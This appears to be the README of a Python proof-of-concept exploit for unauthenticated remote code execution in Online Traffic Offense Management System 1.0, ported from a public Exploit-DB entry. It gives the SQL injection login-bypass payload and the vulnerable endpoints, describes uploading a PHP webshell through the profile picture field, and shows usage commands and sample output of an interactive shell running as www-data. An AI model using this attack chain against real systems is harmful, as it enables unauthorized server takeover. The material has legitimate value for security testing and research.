# Online Traffic Offense Management System 1.0 — Unauthenticated RCE (PoC)

> Unauthenticated remote code execution in Online Traffic Offense Management System v1.0. A SQL injection in the login form bypasses authentication, and the user profile endpoint accepts unrestricted file uploads — including PHP files — served from a web-accessible directory.

---

## How it works

1. Bypasses login via SQLi (`'' OR 1=1-- '`) against `/classes/Login.php`.
2. Scrapes the authenticated user's profile fields.
3. Uploads a PHP webshell through the profile picture field (`/classes/Users.php?f=save`).
4. Parses the profile page to find the uploaded shell's URL.
5. Opens an interactive shell by sending commands via the `cmd` GET parameter.

## Requirements

- Python 3
- Install dependencies:

```bash
python3 -m venv venv
source venv/bin/activate
python3 -m pip install requests beautifulsoup4 prompt_toolkit
```

## Usage

```bash
python3 exploit.py -u http://TARGET
```

**Example:**

```
$ python3 exploit.py -u http://10.10.10.10/management/
[*] Attempting SQLi login bypass...
[+] Login bypassed
[*] Fetching user info...
[*] Uploading webshell...
[+] Webshell uploaded
[*] Locating shell...
[+] Shell URL: http://10.10.10.10/management/uploads/1772076840_evil.php
[+] Target is vulnerable! Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
[+] Shell opened. Type 'exit' or Ctrl+C to quit.

Shell> whoami
www-data
```

## References

- [EDB-50221](https://www.exploit-db.com/exploits/50221)
- [Original PoC by Halit AKAYDIN](https://www.exploit-db.com/exploits/50221)

## Credits

- **Discovery & original exploit:** Halit AKAYDIN (hLtAkydn)
- **Python 3 port & interactive shell:** [Esteban Zárate](https://github.com/estebanzarate)
